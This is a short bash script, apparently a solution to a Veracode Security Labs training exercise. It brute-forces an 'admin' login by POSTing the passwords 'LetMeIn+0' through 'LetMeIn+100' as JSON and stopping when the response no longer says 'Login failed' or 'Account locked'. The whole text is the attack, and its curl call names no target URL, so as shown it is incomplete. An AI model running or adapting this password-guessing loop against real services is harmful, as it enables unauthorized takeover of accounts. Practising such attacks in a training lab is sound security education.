for i in {0..100}; 
do
  password="LetMeIn+""$i";
  curl -X POST -H "Origin: https://securitylabs.veracode.com" -H 'Content-Type: application/json' -d "{\"username\":\"admin\", \"password\":\""$password"\"}" | grep -E 'Login failed|Account locked'
  if (( $? > 0 ))
  then
    echo "PASSWORD IS: ""$password"
    break
  else
    echo "$password"" failed" 
  fi
done